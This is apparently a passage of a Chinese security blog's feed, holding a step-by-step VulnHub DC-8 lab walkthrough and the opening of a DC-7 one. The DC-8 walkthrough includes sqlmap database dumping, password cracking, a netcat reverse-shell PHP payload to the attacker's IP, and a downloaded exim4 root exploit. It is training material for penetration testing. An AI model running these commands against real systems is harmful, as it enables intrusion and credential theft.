src="/./../imgs/$%7Bfiilename%7D/image-20240109215910411.png" alt="image-20240109215910411"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.burp工具的使用</p><p>9.dirsearch目录扫描</p><p>10.SQL注入</p><p>11.ssh登录</p><p>12.openssl命令</p><p>13.端口敲门服务</p><p>14.hydra爆破</p><p>15.目录遍历漏洞</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC-8</title>
    <link href="http://ms02423.top/2024/01/08/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-8/"/>
    <id>http://ms02423.top/2024/01/08/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-8/</id>
    <published>2024-01-08T07:00:10.000Z</published>
    <updated>2024-01-09T07:39:22.618Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">DC-8 <span class="token keyword">is</span> another purposely built vulnerable lab <span class="token keyword">with</span> the intent <span class="token keyword">of</span> gaining experience <span class="token keyword">in</span> the world <span class="token keyword">of</span> penetration testing<span class="token punctuation">.</span>This challenge <span class="token keyword">is</span> a <span class="token keyword">bit</span> <span class="token keyword">of</span> a hybrid between being an actual challenge<span class="token punctuation">,</span> <span class="token operator">and</span> being a <span class="token string">"proof of concept"</span> <span class="token keyword">as</span> <span class="token keyword">to</span> whether two-factor authentication installed <span class="token operator">and</span> configured <span class="token keyword">on</span> Linux can prevent the Linux server <span class="token keyword">from</span> being exploited<span class="token punctuation">.</span>The <span class="token string">"proof of concept"</span> portion <span class="token keyword">of</span> this challenge eventuated <span class="token keyword">as</span> a result <span class="token keyword">of</span> a question being asked about two-factor authentication <span class="token operator">and</span> Linux <span class="token keyword">on</span> Twitter<span class="token punctuation">,</span> <span class="token operator">and</span> <span class="token keyword">also</span> due <span class="token keyword">to</span> a suggestion <span class="token keyword">by</span> @theart42<span class="token punctuation">.</span>The ultimate goal <span class="token keyword">of</span> this challenge <span class="token keyword">is</span> <span class="token keyword">to</span> bypass two-factor authentication<span class="token punctuation">,</span> get root <span class="token operator">and</span> <span class="token keyword">to</span> <span class="token keyword">read</span> the one <span class="token operator">and</span> only flag<span class="token punctuation">.</span>You probably would<span class="token string">n't even know that two-factor authentication was installed and configured unless you attempt to login via SSH, but it'</span>s definitely there <span class="token operator">and</span> doing it's job<span class="token punctuation">.</span>Linux skills <span class="token operator">and</span> familiarity <span class="token keyword">with</span> the Linux command <span class="token keyword">line</span> <span class="token keyword">are</span> a must<span class="token punctuation">,</span> <span class="token keyword">as</span> <span class="token keyword">is</span> some experience <span class="token keyword">with</span> basic penetration testing tools<span class="token punctuation">.</span><span class="token keyword">For</span> beginners<span class="token punctuation">,</span> Google can be <span class="token keyword">of</span> great assistance<span class="token punctuation">,</span> but you can always tweet me <span class="token keyword">at</span> @DCAU7 <span class="token keyword">for</span> assistance <span class="token keyword">to</span> get you going again<span class="token punctuation">.</span> But take note<span class="token punctuation">:</span> I wo<span class="token string">n't give you the answer, instead, I'</span>ll give you an idea about how <span class="token keyword">to</span> <span class="token keyword">move</span> forward<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个flag</p><h2 id="2-靶场下载地址"><a href="#2-靶场下载地址" class="headerlink" title="2.靶场下载地址"></a>2.靶场下载地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>dc-8<span class="token punctuation">,</span><span class="token number">367</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-启动靶场环境"><a href="#3-启动靶场环境" class="headerlink" title="3.启动靶场环境"></a>3.启动靶场环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108150812317.png" alt="image-20240108150812317"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透靶场"><a href="#二-渗透靶场" class="headerlink" title="二.渗透靶场"></a>二.渗透靶场</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.52.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108151209992.png" alt="image-20240108151209992"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108151227780.png" alt="image-20240108151227780"></p><p>靶场的真实ip地址是192.168.52.130</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-A</span> <span class="token parameter variable">-v</span> -p- <span class="token number">192.168</span>.52.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108151537395.png" alt="image-20240108151537395"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开放了<span class="token number">80</span>端口，存在web服务，Apache httpd 发现开放了<span class="token number">22</span>端口，OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>4p1 Debian <span class="token number">10</span><span class="token operator">+</span>deb9u1 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以使用masscan进行探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan <span class="token parameter variable">--rate</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token parameter variable">--ports</span> <span class="token number">0</span>-65535 <span class="token number">192.168</span>.52.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108151820252.png" alt="image-20240108151820252"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.52.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108151946306.png" alt="image-20240108151946306"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108152136730.png" alt="image-20240108152136730"></p><p>可以看到和DC-7是一个cms框架</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108152443953.png" alt="image-20240108152443953"></p><p>使用棱洞3.0指纹识别发现有Drupal</p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-none"><code class="language-none">nikto -h http:&#x2F;&#x2F;192.168.52.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108152754770.png" alt="image-20240108152754770"></p><p>使用nikto工具扫描网站结构，发现robots.txt</p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.52.130 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108154220729.png" alt="image-20240108154220729"></p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-首先我们查看Drupal漏洞"><a href="#1-首先我们查看Drupal漏洞" class="headerlink" title="1)首先我们查看Drupal漏洞"></a>1)首先我们查看Drupal漏洞</h4><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.130</span><span class="token operator">/</span>CHANGELOG<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108154527249.png" alt="image-20240108154527249"></p><p>我们知道版本号是7.67，使用kali进行搜索，但是没有漏洞</p><pre class="line-numbers language-none"><code class="language-none">searchsploit Drupal 7.67<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108154658702.png" alt="image-20240108154658702"></p><h4 id="2-我们访问robots-txt"><a href="#2-我们访问robots-txt" class="headerlink" title="2)我们访问robots.txt"></a>2)我们访问robots.txt</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.130/robots.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108154843180.png" alt="image-20240108154843180"></p><p>可以看到是一些登录页面</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.130</span><span class="token operator">/</span>?q<span class="token operator">=</span>user<span class="token operator">/</span>login<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108155159531.png" alt="image-20240108155159531"></p><p>这个我们先放一放，看能不能有漏洞进行爆破用户名和密码</p><h4 id="3-我们访问目录扫描"><a href="#3-我们访问目录扫描" class="headerlink" title="3)我们访问目录扫描"></a>3)我们访问目录扫描</h4><p>除了&#x2F;user&#x2F;login&#x2F; ，node以外，其他的都没有用</p><p>我们查看node,我们可以看到3行蓝色的字，我们一个一个进行访问，最后发现这里就只加了参数nid，非常可疑，可能存在有SQL注入、xss等漏洞</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.130/node<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108160045654.png" alt="image-20240108160045654"></p><h4 id="4-SQL注入"><a href="#4-SQL注入" class="headerlink" title="4)SQL注入"></a>4)SQL注入</h4><p>在nid参数后面加’</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108160215495.png" alt="image-20240108160215495"></p><p>我们可以看到报错了，可能存在报错注入，我们使用sqlmap进行测试</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">'http://192.168.52.130/?nid=1'</span> <span class="token comment">--level=5 --risk=3 --batch </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108161257221.png" alt="image-20240108161257221"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108161324729.png" alt="image-20240108161324729"></p><p>我们可以看到存在报错注入</p><p>我们爆破数据库</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">'http://192.168.52.130/?nid=1'</span> <span class="token comment">--level=5 --risk=3 --batch --dbs</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108161422185.png" alt="image-20240108161422185"></p><p>有2个数据库，我们爆破d7db数据库</p><p>爆表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">'http://192.168.52.130/?nid=1'</span> <span class="token comment">--level=5 --risk=3 --batch -D 'd7db' --tables</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108161725103.png" alt="image-20240108161725103"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108161744261.png" alt="image-20240108161744261"></p><p>我们可以看到有很多的表，我们爆破users即可</p><p>接着爆字段名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">'http://192.168.52.130/?nid=1'</span> <span class="token comment">--level=5 --risk=3 --batch -D 'd7db' -T 'users' --columns</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108161941021.png" alt="image-20240108161941021"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108162219193.png" alt="image-20240108162219193"></p><p>我们可以看到name和pass，我们想到前面的登录页面，我们进行爆破即可</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">'http://192.168.52.130/?nid=1'</span> <span class="token comment">--level=5 --risk=3 --batch -D 'd7db' -T 'users' -C 'name,pass' --dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108162259708.png" alt="image-20240108162259708"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108162317263.png" alt="image-20240108162317263"></p><p>我们看到2个用户名和密码，但是密码是加密的，我们进行解密</p><h4 id="5-john解密"><a href="#5-john解密" class="headerlink" title="5)john解密"></a>5)john解密</h4><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">john <span class="token keyword">password</span><span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108162809678.png" alt="image-20240108162809678"></p><p>爆破出来一个密码是turtle</p><h4 id="6-登录页面"><a href="#6-登录页面" class="headerlink" title="6)登录页面"></a>6)登录页面</h4><p>我们进行登录页面，john turtle，看到登录成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108163009138.png" alt="image-20240108163009138"></p><h4 id="7-反弹shell"><a href="#7-反弹shell" class="headerlink" title="7)反弹shell"></a>7)反弹shell</h4><p>探索发现在WEBFORM处可以编辑并执行PHP代码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.130/<span class="token comment">#overlay=node/3/webform/configure</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108163501544.png" alt="image-20240108163501544"></p><p>我们输入反弹shell</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpexec(&quot;nc -e &#x2F;bin&#x2F;bash 192.168.52.152 55555&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108164047374.png" alt="image-20240108164047374"></p><p>将提交重定向行Confirmation page（确认页面）给勾上，然后滑下点保存，联系随便填入联系表单，点击发送，触发PHP代码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108164306558.png" alt="image-20240108164306558"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108164342922.png" alt="image-20240108164342922"></p><p>我们可以看到反弹成功</p><h4 id="8-提权"><a href="#8-提权" class="headerlink" title="8)提权"></a>8)提权</h4><p>我们打开交互模式</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108164840324.png" alt="image-20240108164840324"></p><p>找查一下suid权限的二进制文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108164902251.png" alt="image-20240108164902251"></p><p>发现存在exim4,我们进行提权</p><p>我们查看exim4版本号</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">exim4 --version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108165444742.png" alt="image-20240108165444742"></p><p>我们使用kali进行搜索</p><p>searchsploit exim 4</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108203835984.png" alt="image-20240108203835984"></p><p>复制一下文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/exploitdb/exploits/linux/local/46996.sh MS02423.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启http服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-m</span> http.server <span class="token number">8888</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108204043654.png" alt="image-20240108204043654"></p><p>在DC-7中下载该文件，先跳到tmp目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp<span class="token function">wget</span> <span class="token number">192.168</span>.52.152:8888/MS02423.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108204219241.png" alt="image-20240108204219241"></p><p>我们查看文件权限</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108204259982.png" alt="image-20240108204259982"></p><p>可以看到文件是不可执行的，我们可以用chmod命令赋予执行权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> MS02423.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108204408567.png" alt="image-20240108204408567"></p><p>我们执行该文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./MS02423.sh <span class="token parameter variable">-m</span> netcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108204630973.png" alt="image-20240108204630973"></p><p>可以看到现在是root权限</p><p>我们查看flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240108204708067.png" alt="image-20240108204708067"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.[ 隧道技术 ] 反弹shell的集中常见方式（一）nc反弹shell </p><p>9.实现交互式shell的几种方式</p><p>10.dirsearch目录扫描</p><p>11.SQL注入</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC-7</title>
    <link href="http://ms02423.top/2024/01/07/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-7/"/>
    <id>http://ms02423.top/2024/01/07/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-7/</id>
    <published>2024-01-07T05:17:18.000Z</published>
    <updated>2024-01-08T12:47:38.362Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">DC-7 <span class="token keyword">is</span> another purposely built vulnerable lab <span class="token keyword">with</span> the intent <span class="token keyword">of</span> gaining experience <span class="token keyword">in</span> the world <span class="token keyword">of</span> penetration testing<span class="token punctuation">.</span>While this <span class="token keyword">is</span><span class="token string">n't an overly technical challenge, it isn'</span>t exactly easy<span class="token punctuation">.</span>While it<span class="token string">'s kind of a logical progression from an earlier DC release (I won'</span>t tell you which one<span class="token punctuation">)</span><span class="token punctuation">,</span> there <span class="token keyword">are</span> some new concepts involved<span class="token punctuation">,</span> but you will need <span class="token keyword">to</span> figure those out <span class="token keyword">for</span> yourself<span class="token punctuation">.</span> <span class="token punctuation">:</span><span class="token operator">-</span><span class="token punctuation">)</span> <span class="token keyword">If</span> you need <span class="token keyword">to</span> resort <span class="token keyword">to</span> brute forcing <span class="token operator">or</span> dictionary attacks<span class="token punctuation">,</span> you probably won't succeed<span class="token punctuation">.</span>What you will need <span class="token keyword">to</span> do<span class="token punctuation">,</span> <span class="token keyword">is</span> <span class="token keyword">to</span> think <span class="token string">"outside"</span> <span class="token keyword">of</span> the box<span class="token punctuation">.</span>Waaaaaay <span class="token string">"outside"</span> <span class="token keyword">of</span> the box<span class="token punctuation">.</span> <span class="token punctuation">:</span><span class="token operator">-</span><span class="token punctuation">)</span>The ultimate goal <span class="token keyword">of</span> this challenge <span class="token keyword">is</span> <span class="token keyword">to</span> get root <span class="token operator">and</span> <span class="token keyword">to</span> <span class="token keyword">read</span> the one <span class="token operator">and</span> only flag<span class="token punctuation">.</span>Linux skills <span class="token operator">and</span> familiarity <span class="token keyword">with</span> the Linux command <span class="token keyword">line</span> <span class="token keyword">are</span> a must<span class="token punctuation">,</span> <span class="token keyword">as</span> <span class="token keyword">is</span> some experience <span class="token keyword">with</span> basic penetration testing tools<span class="token punctuation">.</span><span class="token keyword">For</span> beginners<span class="token punctuation">,</span> Google can be <span class="token keyword">of</span> great assistance<span class="token punctuation">,</span> but you can always tweet me <span class="token keyword">at</span> @DCAU7 <span class="token keyword">for</span> assistance <span class="token keyword">to</span> get you going again<span class="token punctuation">.</span> But take note<span class="token punctuation">:</span> I wo<span class="token string">n't give you the answer, instead, I'</span>ll give you an idea about how <span class="token keyword">to</span> <span class="token keyword">move</span> forward<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个flag</p><h2 id="2-靶场下载地址"><a href="#2-靶场下载地址" class="headerlink" title="2.靶场下载地址"></a>2.靶场下载地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>dc-7<span class="token punctuation">,</span><span class="token number">356</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-启动靶场环境"><a href="#3-启动靶场环境" class="headerlink" title="3.启动靶场环境"></a>3.启动靶场环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107140106370.png" alt="image-20240107140106370"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透靶场"><a href="#二-渗透靶场" class="headerlink" title="二.渗透靶场"></a>二.渗透靶场</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.52.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107140338185.png" alt="image-20240107140338185"></p><pre class="line-numbers language-none"><code class="language-none">arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107140449593-1704607490137-1.png" alt="image-20240107140449593"></p><p>我们知道靶场ip地址为192.168.52.129</p><h3 id="2-探端口及服务"><a href="#2-探端口及服务" class="headerlink" title="(2)探端口及服务"></a>(2)探端口及服务</h3><pre class="line-numbers language-none"><code class="language-none">nmap -A -V -P- 192.168.52.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107140725475.png" alt="image-20240107140725475"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开放了<span class="token number">80</span>端口，存在web服务，Apache httpd <span class="token number">2.4</span><span class="token number">.25</span> <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>发现开放了<span class="token number">22</span>端口，OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>4p1 Debian <span class="token number">10</span><span class="token operator">+</span>deb9u6 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以使用masscan探活端口</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">masscan --rate<span class="token operator">=</span><span class="token number">10000</span> --ports 0-65535 <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.129</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107141039610.png" alt="image-20240107141039610"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240107141158758.png" alt="image-20240107141158758"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 